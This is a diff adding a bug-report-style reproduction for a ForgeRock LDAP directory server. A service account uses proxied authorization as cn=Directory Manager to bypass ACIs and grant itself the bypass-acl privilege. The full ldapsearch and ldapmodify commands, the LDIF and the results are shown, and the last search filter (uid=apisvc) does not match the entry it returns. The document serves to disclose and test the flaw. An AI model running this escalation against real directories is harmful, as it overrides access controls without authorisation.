@@ -1,0 +1,75 @@
+Proxy-Auth of Rootdn as the authzID gives the bindDN entry bypass-acl access and as a result, the bindDN can now bypass all DIT and Global ACI's.
+
+Application ID = uid=appacct,ou=Service Accounts,dc=forgerock,dc=com
+
+Searching Testcase: with uid=appacct as the bindDN:
+
+This DIT has ACI's that do not allow uid=appacct to return more than 5 entries.
+
+a) authzID as basic user = 0 nentries
+b) authzID as the uid=appacct = 5 nentries
+c) authzID as cn=Directory Manager = 21k nentries
+
+Note: The testcase's new instance has 100 entries.
+
+1) Using a default new user, proxy auth as the rootdn - no proxy-auth privilege.
+
+:bin/$ ./ldapsearch -h localhost -p 1389 -D "uid=appacct,ou=Service Accounts,dc=forgerock,dc=com" -w password -Y "dn:cn=Directory Manager" -b ou=People,dc=forgerock,dc=com uid=user.*
+SEARCH operation failed
+Result Code:  123 (Authorization Denied)
+Additional Information:  You do not have sufficient privileges to use the proxied authorization control
+
+2) Add the proxy-auth privilege
+
+:bin/$ ./ldapmodify -p 1389 -h localhost -D "cn=Directory Manager" -w password --filename ./mod 
+
+dn: uid=appacct,ou=Service Accounts,dc=forgerock,dc=com
+changetype: modify
+add: ds-privilege-name
+ds-privilege-name: proxied-auth
+
+3) Search again
+
+:bin/$ ./ldapsearch -h localhost -p 1389 -D "uid=appacct,ou=Service Accounts,dc=forgerock,dc=com" -w password -Y "dn:cn=Directory Manager" -b ou=People,dc=forgerock,dc=com uid=user.* | grep -c '^dn: '
+100
+
+Modify Testcase: with uid=appacct as the bindDN.
+
+Note: per the above search testcase, uid=appacct already has the proxy-auth privilege.
+
+1) Try to add the bypass-acl to the appacct id.
+
+:bin/$ cat add-new-privilege 
+dn: uid=appacct,ou=Service Accounts,dc=forgerock,dc=com
+changetype: modify
+add: ds-privilege-name
+ds-privilege-name: bypass-acl
+
+:bin/$ ./ldapmodify -p 1389 -h localhost -D "uid=appacct,ou=Service Accounts,dc=forgerock,dc=com" -w password --fileName ./add-new-privilege 
+Processing MODIFY request for uid=appacct,ou=Service Accounts,dc=forgerock,dc=com
+MODIFY operation failed
+Result Code:  50 (Insufficient Access Rights)
+Additional Information:  You do not have sufficient privileges to modify the set of privileges contained in an entry
+
+2) ProxyAs AuthzID cn=Directory manager
+
+:bin/$ ./ldapmodify -p 1389 -h localhost -D "uid=appacct,ou=Service Accounts,dc=forgerock,dc=com" -w password -Y "dn:cn=Directory Manager" --fileName ./add-new-privilege
+Processing MODIFY request for uid=appacct,ou=Service Accounts,dc=forgerock,dc=com
+MODIFY operation successful for DN uid=appacct,ou=Service Accounts,dc=forgerock,dc=com
+
+The uid=appacct now has bypass-acl privileges and can do anything it wants.
+
+:bin/$ ./ldapsearch -p 1389 -D "cn=Directory Manager" -w password --baseDN dc=forgerock,dc=com uid=apisvc +
+dn: uid=appacct,ou=Service Accounts,dc=forgerock,dc=com
+ds-privilege-name: proxied-auth
+ds-privilege-name: bypass-acl
+entryUUID: df3b22ce-e49c-3dda-9433-095314203c1a
+modifyTimestamp: 20150527202901Z
+modifiersName: cn=Directory Manager,cn=Root DNs,cn=config
+etag: 0000000029d8dc0f
+structuralObjectClass: inetOrgPerson
+pwdPolicySubentry: cn=Default Password Policy,cn=Password Policies,cn=config
+numSubordinates: 0
+hasSubordinates: false
+subschemaSubentry: cn=schema
+entryDN: uid=appacct,ou=service accounts,dc=forgerock,dc=com
